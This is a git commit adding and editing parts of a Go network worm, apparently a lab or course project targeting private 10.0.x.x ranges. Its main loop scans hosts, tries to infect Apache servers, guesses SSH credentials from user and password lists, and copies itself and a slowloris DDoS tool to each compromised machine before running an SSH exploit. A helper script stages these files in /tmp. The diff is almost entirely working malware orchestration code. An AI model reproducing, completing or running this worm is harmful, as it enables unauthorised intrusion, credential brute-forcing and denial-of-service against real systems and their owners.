05872e4f597a1c0d935c0fb215ab794a5eba6127
99graciamanel <manel.gracia.sola@gmail.com>
2021-12-03 12:36:16 -0500

    This is not working guys :(

---
+++ copy_files.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+cp ./worm/ddos/slowloris /tmp/
+cp ./worm/main/users.txt /tmp/
+cp ./worm/main/passwords.txt /tmp/
+
+cp ./worm/main/main /tmp/worm
--- worm/main/main.go
+++ worm/main/main.go
@@ -20,43 +20,50 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 		//ip = "localhost"
 		fmt.Println(attackerString + ip)
 		ports = scan.ScanIp(ip)
-		fmt.Println(ports)
+		fmt.Println(attackerString)
 		infected := false
 		//Apache infect
 		if ports[0] != 0 {
+			fmt.Println(attackerString + " trying to infect apache")
 			if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
 				infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
 				fmt.Println(infected)
 			}
 		}
 		//SSH infect
-		if !infected && ports[1] != 0 {
-			ip_port := ip + ":" + strconv.Itoa(ports[1])
-			hit_credentials := infection.GuessSSHConnection(ip_port)
-			if hit_credentials{
-				is_infected := infection.SshCheckInfection(ip_port)
-				fmt.Println(is_infected)
-				if is_infected {
-					continue
-				}
-				message := infection.SshInfect(ip_port, "worm")
-				message = infection.SshInfect(ip_port, "users.txt")
-				message = infection.SshInfect(ip_port, "pwds.txt")
-				message = infection.SshInfect(ip_port, "DNSlist.txt")
-				message = infection.SshInfect(ip_port, "dnsdrdos.o")
-				message = infection.SshInfect(ip_port, "slowloris")
-				fmt.Println(message)
-				message = infection.SshExploit(ip_port)
-				fmt.Println(message)
-				infected = true
+		fmt.Println(attackerString + " trying to infect ssh")		
+		ip_port := ip + ":" + strconv.Itoa(ports[1])
+		hit_credentials := infection.GuessSSHConnection(ip_port)
+		if hit_credentials{
+			is_infected := infection.SshCheckInfection(ip_port)
+			fmt.Println(is_infected)
+			if is_infected {
+				continue
 			}
+			message := infection.SshInfect(ip_port, "worm")
+			message = infection.SshInfect(ip_port, "users.txt")
+			message = infection.SshInfect(ip_port, "pwds.txt")
+			//message = infection.SshInfect(ip_port, "DNSlist.txt")
+			//message = infection.SshInfect(ip_port, "dnsdrdos.o")
+			message = infection.SshInfect(ip_port, "slowloris")
+			fmt.Println(message)
+			message = infection.SshExploit(ip_port)
+			fmt.Println(message)
+			infected = true
 		}
+//		if !infected && ports[1] != 0 {
+//
+//		}
 		//Confluence infect
 		if !infected && ports[2] != 0 {
+			fmt.Println(attackerString + " trying to infect confluence")		
 			fmt.Println("Not implemented")
 			infected = true
 		}
+		fmt.Println(attackerString + " done")	
 	}
+	fmt.Println(attackerString + " attacker done")		
+	
 	wg.Done()
 }
 
@@ -70,7 +77,7 @@ func main() {
 	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
 	for i := 0; i < nAttackers; i++ {
 		wg.Add(1)
-		go attack(&wg, i, baseIp[i%2])
+		go attack(&wg, i, baseIp[1])
 	}
 	wg.Wait()
 }
